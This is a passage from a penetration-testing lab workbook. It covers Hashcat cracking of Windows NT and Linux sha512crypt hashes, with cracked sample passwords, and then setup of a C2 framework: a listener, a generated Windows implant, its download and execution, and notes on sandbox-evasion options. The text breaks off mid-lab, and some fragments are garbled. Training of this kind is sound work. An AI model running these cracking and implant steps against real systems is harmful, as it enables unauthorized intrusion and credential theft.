- 1 : *Low.* Minimal impact on GUI performance and low power consumption •
- 2 : *Default.* Noticeable impact on GUI and economic power consumption •
- 3 : *High.* High power consumption and potentially unresponsive GUI •
- 4 : *Nightmare.* Insane power consumption and a headless server because the GUI will not have enough CPU or GPU to respond •

For this lab, we'll use -w 3 because we can often reasonably get about 30% higher performance, and the GUI will be responsive enough for us to conduct the lab.

Next, let's perform some performance measures of Hashcat for common hashing algorithms.

hashcat -w 3 --benchmark -m 3000

#### Expected Results

sec560@560vm:~\$ hashcat -w 3 --benchmark -m 3000 hashcat (v7.1.1-82-g95aa837b7) starting in benchmark mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL\_DEBUG) - Platform #1 [The pocl project]

==============================================================================================================

\* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2946/5893 MB (1024 MB allocatable), 4MCU

#### Benchmark relevant options:

===========================

- \* --backend-devices-virtmulti=1
- \* --backend-devices-virthost=1
- \* --workload-profile=3

---------------------

\* Hash-Mode 3000 (LM)

---------------------

Speed.#01........: 147.7 MH/s (26.29ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8

Started: Thu Sep 18 22:04:51 2025 Stopped: Thu Sep 18 22:05:09 2025

Here you can see the performance in megahashes per second ( MH/s). In this example it's approximately 147 million hashes per second, but your results will vary. If your speed is below 100 MH/s, it will likely display as kilohashes ( kH/s ) and be a 5 digit number, like 92190.7 kH/s .

Next, let's look at the performance of cracking salted MD5 (*md5crypt*) hashes by running:

hashcat -w 3 --benchmark -m 500

#### Expected Results

sec560@560vm:~\$ hashcat -w 3 --benchmark -m 500 hashcat (v7.1.1-82-g95aa837b7) starting in benchmark mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL\_DEBUG) - Platform #1 [The pocl project]

==============================================================================================================

\* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2946/5893 MB (1024 MB allocatable), 4MCU

#### Benchmark relevant options:

===========================

- \* --backend-devices-virtmulti=1
- \* --backend-devices-virthost=1
- \* --workload-profile=3

------------------------------------------------------------------------------

\* Hash-Mode 500 (md5crypt, MD5 (Unix), Cisco-IOS \$1\$ (MD5)) [Iterations: 1000]

------------------------------------------------------------------------------

Speed.#01........: 27643 H/s (99.13ms) @ Accel:698 Loops:1000 Thr:1 Vec:8

Started: Thu Sep 18 22:17:15 2025 Stopped: Thu Sep 18 22:17:30 2025

Here, we see significantly slower performance. Remember that md5crypt involves 1,000 rounds of MD5 hashing, which takes additional time.

And finally, let's look at the performance characteristics of *sha512crypt*, the \$6\$ hashes associated with some Linux machines:

hashcat -w 3 --benchmark -m 1800

#### Expected Results

sec560@560vm:~\$ hashcat -w 3 --benchmark -m 1800 hashcat (v7.1.1-82-g95aa837b7) starting in benchmark mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL\_DEBUG) - Platform #1 [The pocl project]

============================================================================================================== \* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2946/5893 MB (1024 MB allocatable), 4MCU

#### Benchmark relevant options:

===========================

- \* --backend-devices-virtmulti=1
- \* --backend-devices-virthost=1
- \* --workload-profile=3

--------------------------------------------------------------------

\* Hash-Mode 1800 (sha512crypt \$6\$, SHA512 (Unix)) [Iterations: 5000]

--------------------------------------------------------------------

Speed.#01........: 2547 H/s (102.40ms) @ Accel:330 Loops:1000 Thr:1 Vec:4

Started: Thu Sep 18 22:19:21 2025 Stopped: Thu Sep 18 22:19:41 2025

Notice how *LM* cracking has the highest performance, with *md5crypt* being slower, and *sha512crypt* being even slower. With slower hash types, we are limited in the number of attempts we can make in the same amount of time. In fact, *sha512crypyt* is many orders of magnitude slower than *LM* cracking.

#### *2: Cracking with Hashcat*

Before we start cracking, let's create a folder for cracking and save ourselves some typing by creating a few symbolic links.

# Command mkdir cracking && cd cracking Expected Results sec560@560vm:~\$ mkdir cracking && cd cracking sec560@560vm:~/cracking\$

These symbolic links will shorten up our commands a bit, especially when we start using rules.

#### Command

ln -s /usr/share/wordlists/ wordlists

ln -s /usr/share/dict/ dict

ln -s /pentest/password-recovery/hashcat/rules/ rules

These commands have no expected output.

Next, lets create a hashes folder for all of our password dumps, and copy our dumps into it.

#### Command

mkdir hashes&& cp ~/labs/web\* hashes/ && ls -1 hashes

#### Expected Results

sec560@560vm:~/cracking\$ mkdir hashes &&cp ~/labs/web\* hashes/ && ls -1 hashes web01.hashes web10.shadow

We'll use Hashcat to crack the passwords from the web01.hashes file in the hashes directory and use the RockYou password list. While we can attack the *LM* hashes with hashcat ( -m 3000), we're going to focus on the *NT* hashes.

Invoke Hashcat with a workload pro file of 3 ( -w 3 ) to use as much computing power as it can while still preserving some GUI access, with attack mode zero ( -a 0 ) to use our dictionary as-is to crack hash type 1000, which is *NT* (-m 1000). We'll then specify our web01.hashes file to crack and rockyou.txt as our dictionary, as follows.

hashcat -w 3 -a 0 -m 1000 hashes/web01.hasheswordlists/rockyou.txt

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -w 3 -a 0 -m 1000 hashes/web01.hasheswordlists/rockyou.txt hashcat (v7.1.1-82-g95aa837b7) starting ...truncated for brevity...

#### Dictionary cache built:

\* Filename..: wordlists/rockyou.txt

\* Passwords.: 14344394 \* Bytes.....: 139921525 \* Keyspace..: 14344387 \* Speed.....: 393 MiB/s

\* Runtime...: 0.35s

31d6cfe0d16ae931b73c59d7e0c089c0:

5bd9b7b6fce76d3aabfebee9debaa932:Warrior07 87e968ead530264915a4b295c57c37d5:Tibbetts3 5deaec4b57b859c25cdd0513fb7bc750:Patrique2238 d8d9eee954da5f2d42fe72f862fa493f:Packardbell350

9b5684b030226a1203e4e7b718a3f9df:Oozle11

23d26a03aa7102abce4805d88e568a78:KAMTPS20!!tim

...truncated for brevity...

#### The Yellow Text

You may notice as you work through the lab that Hashcat adds usage tips in yellow to the output. For the purposes of this lab, they can be ignored; however, for those that want to master the tool, it's good information to review at a later date.

As you can see we cracked a lot of the passwords!

Let's now take a look at the rules available in Hashcat.

ls -1 rules/

#### Expected Results

sec560@560vm:~/cracking\$ ls -1 rules/ best66.rule combinator.rule d3ad0ne.rule dive.rule generated2.rule generated.rule hybrid Incisive-leetspeak.rule InsidePro-HashManager.rule InsidePro-PasswordsPro.rule leetspeak.rule oscommerce.rule rockyou-30000.rule specific.rule stacking58.rule T0XlC\_3\_rule.rule T0XlC-insert\_00-99\_1950-2050\_toprules\_0\_F.rule T0XlC\_insert\_HTML\_entities\_0\_Z.rule T0XlC-insert\_space\_and\_special\_0\_F.rule T0XlC-insert\_top\_100\_passwords\_1\_G.rule T0XlC.rule T0XlCv2.rule toggles1.rule toggles2.rule toggles3.rule toggles4.rule toggles5.rule top10\_2025.rule

unix-ninja-leetspeak.rule

As you can see, Hashcat has a lot of different rules files. Let's look at one of the most useful, best66.rule :

### Command head -n 30 rules/best66.rule Expected Results sec560@560vm:~/cracking\$ head -n 30 rules/best66.rule ## nothing, reverse, case... base stuff : r u T0 ## simple number append \$0 \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 ## special number append \$0 \$0 \$0 \$1 \$0 \$2 \$1 \$1 \$1 \$2 \$1 \$3 \$2 \$1 \$2 \$2 \$2 \$3 \$6 \$9 \$7 \$7

The whitespace above is ignored by Hashcat itself, but it helps to make it more readable for humans. The \$0 \$0 means password00 (appending two zeroes to each candidate).

In this rule file, you see that each word is attempted as is ( : ), reversed (r ), and all uppercase ( u ), and the case of the first character is toggled ( T0). Additionally, each word ( \$ ) is taken and a single digit applied to the end of it ( \$0 up to \$9). We then have each word with a digit repeated twice ( \$0 \$0 ), remembering that whitespace is ignored. The rules in this file go on and on and are often quite clever.

Let's use best66.rule with to help crack the web01 hashes. Specify the rule file with -r :

hashcat -w 3 -a 0 -m 1000 hashes/web01.hasheswordlists/rockyou.txt -r rules/best66.rule

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -w 3 -a 0 -m 1000 hashes/web01.hasheswordlists/rockyou.txt -r rules/best66.rule

hashcat (v7.1.1-82-g95aa837b7) starting

...trimmed for brevity...

INFO: Removed 11 hashes found as potfile entries.

#### Host memory allocated for this attack: 513 MB (5327 MB free)

Dictionary cache built:

\* Filename..: wordlists/rockyou.txt

\* Passwords.: 14344394

\* Bytes.....: 139921525

\* Keyspace..: 946729542

\* Speed.....: 517 MiB/s

\* Runtime...: 0.26s

5ae44bf0a1e24c0b1ec96708f30e7b84:Smitten77 92929561b2758f409df2b4a24a59c6f4:Alphabet23

Approaching final keyspace - workload adjusted.

Session..........: hashcat Status...........: Exhausted

...truncated for brevity...

#### Slow

This can take a few minutes. After you get one password, feel free to press q to quit and move on.

This found two more passwords! Notice in the results above that Hashcat *removed 11 hashes* because it already cracked them.

When that finishes running, let's look at our results:

hashcat -m 1000 --username --show --outfile-format 2 hashes/web01.hashes

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -m 1000 --username --show --outfile-format 2 hashes/web01.hashes Mixing --show with --username or --dynamic-x can cause exponential delay in output.

Guest:

DefaultAccount: slopez:Tibbetts3 aparker:Oozle11 rgray:KAMTPS20!!tim wrobinson:Patrique2238 mlara:Packardbell350 lstout:2soWht!a tandersen:Angels100% awalker:Chirmol01 mmiller:BHLMSTz2 vcollins:Warrior07 hhopkins:Alphabet23

#### *3: Hashcat and Masking*

kcooper:Smitten77

The rules provided with Hashcat are great, but we can customize this even further. If we want to append all possible two-digit numbers, we can use ?d?d. If you look closely at the best66.rule , you'll notice it doesn't use all two digit numbers. Let's perform a mask attack using all two digit numbers. Also, let's use an English dictionary as our base password list. Since many passwords tend to have capitalized words, let's take an existing dictionary ( dict/american-english-insane ) and capitalize the first letter using -j 'c' . We'll then append two digits to the end of each capitalized dictionary entry using mode 6 (mode 7 is prepend, with the mask before each word list entry).

Hashcat supports one rule per word list in combinator and hybrid modes. We use -j to specify a rule for a word list on the left, and -k if the word list is on the right. In our attack, the rule to capitalize the first letter is c .

hashcat -w 3 -a 6 -m 1000 hashes/web01.hashesdict/american-english-insane ?d?d -j 'c'

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -w 3 -a 6 -m 1000 hashes/web01.hashesdict/american-englishinsane ?d?d -j 'c'

hashcat (v7.1.1-82-g95aa837b7) starting

...trimmed for brevity...

a6051a02b7a2bfb4cd0e2c1a9cb4a694:Civilness12 7ce56170c73f9582fa348db88de2c192:Gathering81 baa90a3ad89d359009ce5425063dff3e:Hemocytogenesis42

Approaching final keyspace - workload adjusted.

Session..........: hashcat Status...........: Exhausted ...truncated for brevity...

Let's look at all the passwords we cracked:

hashcat -m 1000 --username --show --outfile-format 2 hashes/web01.hashes

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -m 1000 --username --show --outfile-format 2 hashes/web01.hashes Mixing --show with --username or --dynamic-x can cause exponential delay in output.

Guest:

DefaultAccount: slopez:Tibbetts3 aparker:Oozle11 rgray:KAMTPS20!!tim wrobinson:Patrique2238 mlara:Packardbell350 lstout:2soWht!a tandersen:Angels100% awalker:Chirmol01 mmiller:BHLMSTz2 vcollins:Warrior07 jrivera:Hemocytogenesis42 hhopkins:Alphabet23 kcooper:Smitten77

ksutton:Civilness12 rduarte:Gathering81

#### *4: Cracking Linux Passwords with Hashcat*

Let's crack the hashes from web10 using Hashcat, specifically the \$6\$ hashes associated with sha512crypt.

As we mentioned earlier in this course, it can be very helpful to take already-cracked passwords and add them to a dictionary file so that we do not have to apply word-mangling rules to them again before rediscovering the password when it is hashed using a different algorithm. In other words, we've already mangled some words and cracked their hashes, so why mangle those words again if we come up against the same password with a different hash algorithm? We'll be more efficient if we take the mangled words and add them to our word list file.

Let's save all the passwords we cracked from the Windows system to a file. We'll use the same command as above, but since we don't need the username we'll omit the --username option.

hashcat -m 1000 --show --outfile-format 2 hashes/web01.hashes| tee web01\_passwords.txt

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -m 1000 --show --outfile-format 2 hashes/web01.hashes| tee web01\_passwords.txt

Tibbetts3

Oozle11

KAMTPS20!!tim

Patrique2238

Packardbell350

2soWht!a

Angels100%

Chirmol01

BHLMSTz2

Warrior07

Hemocytogenesis42

Alphabet23

Smitten77

Civilness12

Gathering81

#### If you didn't crack all the passwords

Some of the cracking above can take a while, and we told you to abort the cracking session to save time. To create a useful list, you can run these commands instead. Copy the commands below and paste them into your terminal.

echo 'Tibbetts3' > web01\_passwords.txt

echo 'Oozle11' >> web01\_passwords.txt

echo 'KAMTPS20!!tim' >> web01\_passwords.txt

echo 'Patrique2238' >> web01\_passwords.txt

echo 'Packardbell350' >> web01\_passwords.txt

echo '2soWht!a' >> web01\_passwords.txt

echo 'Angels100%' >> web01\_passwords.txt

echo 'Chirmol01' >> web01\_passwords.txt

echo 'BHLMSTz2' >> web01\_passwords.txt

echo 'Warrior07' >> web01\_passwords.txt

echo 'Hemocytogenesis42' >> web01\_passwords.txt

echo 'Alphabet23' >> web01\_passwords.txt

echo 'Smitten77' >> web01\_passwords.txt

echo 'Civilness12' >> web01\_passwords.txt

echo 'Gathering81' >> web01\_passwords.txt

Now let's use Hashcat to crack some Linux hashes!

#### Command

hashcat -w 3 -a 0 -m 1800 hashes/web10.shadowweb01\_passwords.txt -r rules/best66.rule

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -w 3 -a 0 -m 1800 hashes/web10.shadow web01\_passwords.txt -r rules/ best66.rule

hashcat (v6.2.6) starting

...trimmed for brevity...

\$6\$NrJ1MrVq6RuL52OC\$1cEZX4XDaBAX6rrK.XXX3ncv/

AKctoe5xUfOCyfbmnYmLC02jwJ1FbxA7lBlEnhdE4nM2vYuGZJteCswLdULM0:Patrique223877

...truncated for brevity...

#### Token length exception

You will see a lot of lines with a Token length exception like this:

Hash parsing error in hashfile: 'hashes/web10.shadow' on line 1 (root:\*:18960:0:99999:7:::): Token length exception

These lines do not match the sha512crypt format since the accounts do not have a password set. You can safely ignore these warnings.

#### Slow

Even with just a few guesses, the mangling rules and the computational complexity of sha512crypt means this crack will take 2-3 minutes. Let it run and read ahead.

The options we used are:

- -w 3 : Workload "High", which increases the performance of Hashcat at the expense of the interactive desktop (which is fine for our use case) •
- -a 0 : "Straight" mode, use the dictionary with no changes •
- -m 1800: Hash mode of "sha512crypt 6, SHA512 (Unix)" •
- hashes/web10.shadow: The file containing hashes •
- web01\_passwords.txt: The wordlist •
- -r rules/best66.rule : Mangling rules file •

You can hit the s key to get the status, which will also be displayed on the screen periodically. When it finishes running, let's look at our results:

#### Command

hashcat -m 1800 --username --show --outfile-format 2 hashes/web10.shadow

#### Expected Results

sec560@560vm:~/cracking\$ hashcat -m 1800 --username --show --outfile-format 2 hashes/web10.shadow Mixing --show with --username or --dynamic-x can cause exponential delay in output.

Hashfile '/home/sec560/labs/web10.shadow' on line 1 (root:\*:18960:0:99999:7:::): Token length exception

Hashfile '/home/sec560/labs/web10.shadow' on line 2 (daemon:\*:18960:0:99999:7:::): Token length exception

...trimmed for brevity...

wrobinson:Patrique223877

User wrobinson uses a similar password on the two systems. The user selected Patrique2238 on Windows and Patrique223877 on Linux.

Let's take a look at hashcat's pot file:

#### Command

cat ~/.local/share/hashcat/hashcat.potfile

In this file you'll see all the hashes and passwords you've cracked!

We have now seen how we can create specialized dictionaries of usernames and already-cracked passwords to improve the success rate of Hashcat in cracking passwords.

To clean up, let's remove the potfile:

#### Command

rm ~/.local/share/hashcat/hashcat.potfile

This command has no output. If the file doesn't exist (as it's already been removed), you will receive an error. That error is OK.

#### Conclusion

In this lab, we have leveraged Hashcat to crack Windows and Linux password hashes. We've also looked at how we can apply word-mangling rules to our Hashcat runs and how we can leverage usernames and already-cracked passwords to create new dictionaries of potential passwords for Hashcat. Each of these techniques is highly useful in real-world penetration testing.

#### No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

#### Are you using Apple silicon?

will be presented. Throughout the lab, we've annotated differences in the following ways:

For minor interface and output differences, we highlight them with expandable Info blocks like this:

#### Apple silicon users...

A brief message explaining a visual difference you may encounter.

And for anything that requires an alternate command, a Warning box with the necessary command:

#### Apple silicon users...

An explanation

alternate-command

#### Objectives

•

- To set up multiplayer and get familiar with the multiplayer capabilities •
- To create a listener and generate a payload to connect to the listener •
- fically execute-assembly •

#### Lab Setup

VMs used:

- Linux •
- Windows 11 •

Ensure that you can ping from the Linux VM to your Windows VM, and vice versa, for this lab.

#### Command

ping -c 4 WINDOWS\_ETHERNET0\_ADDRESS

#### Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

# Replace LINUX\_ETH0\_ADDRESS with the address of your Linux VM's eth0 interface (NOT the address like 10.254.25X.X on tun0). Command ping LINUX\_ETH0\_ADDRESS Replace LINUX\_ETH0\_ADDRESS!

#### Lab – Step-by-Step Instructions

# Command

You can run everything from here, but let's set up multiplayer mode.

At this point, you should see a prompt that looks like this:

![](SEC560_WorkBook1_page_240_Figure_5.jpeg)

Take a look at the help.

| Command |  |  |  |
|---------|--|--|--|
|         |  |  |  |
| help    |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |
|         |  |  |  |

#### Expected Results

#### Commands:

=========

 clear clear the screen exit exit the shell

help use 'help [command]' for command help

wg-config Generate a new WireGuard client config

wg-portfwd List ports forwarded by the WireGuard tun interface

wg-socks List socks servers listening on the WireGuard tun interface

#### Generic:

========

aliases List current aliases

armory Automatically download and install extensions/aliases

background Background an active session

 beacons Manage beacons builders List external builders

 canaries List previously generated canaries cursed Chrome/electron post-exploitation tool kit

dns Start a DNS listener

 env List environment variables generate Generate an implant binary hosts Manage the database of hosts

 http Start an HTTP listener https Start an HTTPS listener implants List implant builds

jobs Job control

licenses Open source licenses

loot Manage the server's loot store

mtls Start an mTLS listener

prelude-operator Manage connection to Prelude's Operator

profiles List existing profiles

reaction Manage automatic reactions to events

 regenerate Regenerate an implant sessions Session management settings Manage client settings stage-listener Start a stager listener tasks Beacon task management

update Check for updates

use Switch the active session or beacon

version Display version information

websites Host static content (used with HTTP C2)

wg Start a WireGuard listener

#### Multiplayer:

============

kick-operator Kick an operator from the server

multiplayer Enable multiplayer mode

new-operator Create a new operator config file

operators Manage operators

Most of the commands we want to look at are in the Generic category. The Multiplayer category is only available on the server. It allows you to con figure and add new users (operator or player) so you can work together as a team.

#### *2: Multiplayer Mode*

Let's configure multiplayer mode and connect as a client. First, we need to enable multiplayer by running the multiplayer command.

# Command multiplayer Expected Results [\*] Multiplayer mode enabled!

The Multiplayer options are only available on the server, not any of the clients.

We'll create a user and connect with the certificate so we can simulate having multiple people on the same system.

First, we need to know the options to use to create a new player. Run new-operator -h to look at the help for this command.

# Command new-operator -h Expected Results Create a new player config file Usage: ====== new-operator -h [flags] Flags: ====== -h, --help display help -l, --lhost string listen host -p, --lport int listen port (default: 31337) -n, --operator string operator name -s, --save string directory/file to the binary to

Let's create a new user. We'll use the name zerocool , but you can use a preferred handle of your choice. For the IP address, use the address of your eth0 interface (so, NOT the 10.254.25X.X that your tun0 interface would have).

#### Command

Note: Replace LINUX\_ETH0\_ADDRESS with the IP address of your eth0 interface.

new-operator -n zerocool -l LINUX\_ETH0\_ADDRESS

#### Apple Silicon users...

If you are using Apple silicon, you will need an additional parameter for the new-operator command.

new-operator -n zerocool -l LINUX\_ETH0\_ADDRESS --permissions all

#### Expected Results

- [\*] Generating new client certificate, please wait ...
- [\*] Saved new client config to: /home/sec560/zerocool\_192.168.188.143.cfg

#### Open a new terminal window then complete the following:

This cfg file can be shared with the new player. If you want to try it, create a new player and share the file with the other person (in

the capstone CTF.

In your new terminal, examine the configuration file with ls -l .

# Command ls -l \*.cfg Expected Results sec560@560vm:~\$ ls -l \*.cfg -rw------- 1 root root 1980 Sep 21 01:04 zerocool\_192.168.188.143.cfg

We ran the server as root so it can listen on TCP port 443. This also means that any files created by the process are going to be owned by root too. This file is even further restricted so only the owner (root) can read it. We need to change the permissions on the file so we can read it.

# Command sudo chown sec560:sec560 \*.cfg && ls -l \*.cfg Expected Results sudo chown sec560:sec560 \*.cfg && ls -l \*.cfg -rw------- 1 sec560 sec560 1980 Sep 21 01:04 zerocool\_192.168.188.143.cfg

Let's practice the import process on our local system. First, we'll look at the options with .

![](SEC560_WorkBook1_page_246_Figure_0.jpeg)

Import the configuration file using the import subcommand.

![](SEC560_WorkBook1_page_246_Figure_2.jpeg)

Now we can connect to the server. Run the command, and use the down arrow key to selector arrow to zerocool@LINUX\_ETH\_IP... and pres Enter .

![](SEC560_WorkBook1_page_247_Figure_0.jpeg)

After you select the right user and press Enter, you will be presented with the prompt. Notice in your server terminal window that it show [\*] zerocool has joined the game .

#### *3: Creating a Listener and an Implant Payload*

#### Run this command in the client ( ) NOT the server ( )!

Let's start off by creating an https listener.

### Command https -h Expected Results Start an HTTPS listener Usage: ====== https [flags] Flags: ====== -c, --cert string PEM encoded certificate file -D, --disable-otp disable otp authentication -E, --disable-randomized-jarm disable randomized jarm fingerprints -d, --domain string limit responses to specific domain -h, --help display help -k, --key string PEM encoded private key file -e, --lets-encrypt attempt to provision a let's encrypt certificate -L, --lhost string interface to bind server to -J, --long-poll-jitter string server-side long poll jitter (default: 2s) -T, --long-poll-timeout string server-side long poll timeout (default: 1s) -l, --lport int tcp listen port (default: 443) -p, --persistent make persistent across restarts -t, --timeout int command timeout in seconds (default: 60) -w, --website string website name (see websites cmd)

In the real world, we would setup a certificate (or a Let's Encrypt certificate) and set up a domain. For now, we'll just use the IP address.

Let's start a simple https listener.

# Command https Expected Results [\*] Starting HTTPS :443 listener ... [\*] Successfully started job #2

Notice that it said job #2 . Let's take a look at the jobs.

![](SEC560_WorkBook1_page_249_Figure_1.jpeg)

The first job running on port 31337 is for remote user (multiplayer). We also have our https listener running on the default port 443.

Now we have our listener configured to receive our connection. Let's look at building a payload.

generate -h

#### Expected Response

```
Command: generate <options>
++ Command and Control ++
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --
mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
...truncated for brevity...
++ Formats ++
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF.
...truncated for brevity...
++ DNS Canaries ++
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation 
process.
...truncated for brevity...
++ Execution Limits ++
configurations.
++ Profiles ++
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable 
...truncated for brevity...
Usage:
======
generate [flags]
Flags:
======
-a, --arch string cpu architecture (default: amd64)
-c, --canary string canary domain(s)
-d, --debug enable debug features
...truncated for brevity...
Sub Commands:
=============
beacon Generate a beacon binary
info Get information about the server's compiler
stager Generate a stager using Metasploit (requires local Metasploit installation)
```

#### The generate -h

we discussed in class is guardrails. There are a few interesting guardrails that we can use to attempt to bypass sandbox technology. Let's take a look at a few of them:

- -w , --limit-datetime : limit execution to before datetime •
- -x , --limit-domainjoined : limit execution to domain joined machines •
- -F , --limit-fileexists : limit execution to hosts with this file in the filesystem •
- -z , --limit-hostname : limit execution to specified hostname •
- -y , --limit-username : limit execution to specified username •

We aren't going to use these options, but the -x , --limit-domainjoined is typically a good option to bypass simple sandbox defenses.

We can also specify a "canary" (-c , --canary ) domain. The canary domain is included in the executable, but not used for the C2. It is included so that if the target queries the domain, you can be tipped off that someone is researching the domain. We'll skip that feature for now.

payloads. To speed up the lab, we use --skip-symbols to skip this step. In the real world, you won't want to use this option.

Let's build a Windows payload to connect back to our listener. We need to specify the listener and the OS.

This command can take up to a minute to generate the payload.

generate --os windows --skip-symbols --name first --http LINUX\_ETH0\_ADDRESS

Replace LINUX\_ETH0\_ADDRESS with the address of your Linux VM's eth0 interface (NOT the address like 10.254.25X.X on tun0).

#### Expected Results

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [\*] Build completed in 10s
- [\*] Implant saved to /home/sec560/first.exe

#### Apple silicon users...

payload will work for this lab using Windows Prism emulation platform. At the end of the lab, Bonus 3 - Dumping Hashes

based Windows target at this time.

#### Getting ' [ ! ] rpc error: Unknown desc =...' ?

If you receive an rpc error , it's most often caused by attempting to create two implants with the same name. If you are repeating this lab or ran this command more than once, there is already a first . You can verify by running implants and looking for first in the output. Either delete the original with implants rm first , or pick a different name for this payload, like last . If you run this a third time, you're on your own for names.

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [!] rpc error: code = Unknown desc = UNIQUE constraint failed: implant\_builds.name

Let's take a look at the implant we just generated.

| Command                                                                                                                |                                                               |  |  |  |  |
|------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------|--|--|--|--|
| implants                                                                                                               |                                                               |  |  |  |  |
| Expected Results                                                                                                       |                                                               |  |  |  |  |
| Name<br>Control                                                                                                        | Implant Type Template OS/Arch<br>Format<br>Command &<br>Debug |  |  |  |  |
| ====================== ============== ========== =============== ============<br>============================= ======= |                                                               |  |  |  |  |
| 192.168.188.143 false                                                                                                  |                                                               |  |  |  |  |

#### *4: Sending the Payload to the Windows System*

Open a new terminal window so we can create a server to send the payload to our Windows system.

Since the instructions told you to run the prompt as root, we need to add ( + ) the read ( r ) permission for "others" ( o ). We'll do that with chmod o+r first.exe , and then serve it via Python HTTP Server.

#### Command

sudo chmodo+r first.exe && python3 -m http.server

#### Expected Results

sec560@560vm:~\$ sudo chmodo+r first.exe && python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Switch to your Windows host and open the Terminal shortcut on your desktop.

curl.exe -O http://LINUX\_ETH0\_ADDRESS:8000/first.exe

Replace LINUX\_ETH0\_ADDRESS with the IP address of our Slingshot Linux VM's eth0 interface.

#### Expected Results

PS C:\Users\sec560> curl -O http://192.168.188.143:8000/first.exe % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 10.5M 100 10.5M 0 0 86.5M 0 --:--:-- --:--:-- --:--:-- 86.8M

In PowerShell, let's confirm the file was copied.

#### Command

ls first.exe

#### Expected Results

PS C:\Users\sec560> ls .\first.exe

Directory: C:\Users\sec560

Mode LastWriteTime Length Name ---- ------------- ------ ----

-a--- 9/20/2025 10:00 PM 10981376 first.exe

The file should be about 10MB.

#### *5: Executing the Payload*

Run the executable from your terminal.

#### Command

.\first.exe

There is no output for this command.

moment. It can take 30 seconds or longer sometimes for the sessions to be displayed.

#### Expected results

[\*] Session e2e1e42c first - 192.168.188.145:52130 (SEC560-Windows) - windows/amd64 - Sun, 21 Sep 2025 02:54:13 UTC

Take a look at our session with sessions .

![](SEC560_WorkBook1_page_255_Figure_4.jpeg)

(Your output may vary slightly from the above.)

Let's interact with the session using use. If you type use and press TAB, it will automatically select the full UUID of your session. If you had more than one session, hitting TAB would display all the sessions available and let you select the one you wanted. You can also specify the first few characters of your session ID after use. Press Enter to use your session.

# your session and press Enter . Command use <TAB> Apple silicon users... sessions e2e1e42c -- first (5540) SEC560-WINDOWS\sec560@SEC560-Windows ... commands beacons -- Switch the active beacon sessions -- Switch the active session

#### Command

use e2e1e42c-e7a4-49c8-92ab-db4bb3070065

#### Expected Results

[\*] Active session first (e2e1e42c-e7a4-49c8-92ab-db4bb3070065)

Notice the first section of your session's UUID matched the ID column from the sessions command.

We are in our session!

#### *6: Interacting with the Session*

Let's look at the options available in our session by running help .

help

#### Expected Results

#### Commands:

=========

clear clear the screen exit exit the shell

help use 'help [command]' for command help

...truncated for brevity...

#### Generic:

========

aliases List current aliases

armory Automatically download and install extensions/aliases

...truncated for brevity...

#### Multiplayer:

============

operators Manage operators ...truncated for brevity...

#### =================

dllhijack Plant a DLL for a hijack scenario

execute-assembly Loads and executes a .NET assembly in a child process (Windows Only)

...truncated for brevity...

=======

cat Dump file to stdout cd Change directory

chmod Change permissions on a file or directory

...truncated for brevity...

The most interesting commands are going to be in the and

#### Why are the domains different?

Let's first get some information on the compromised system.

![](SEC560_WorkBook1_page_258_Figure_1.jpeg)

The getuid and getgid commands return the SID of the user and group, respectively. This isn't terribly useful information (at least, until we get to Active Directory attacks!). The whoami command is much better for now.

![](SEC560_WorkBook1_page_258_Figure_3.jpeg)

If you want all this information (and more) with a single command, run the info command.

| Command<br>info |  |  |  |
|-----------------|--|--|--|
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
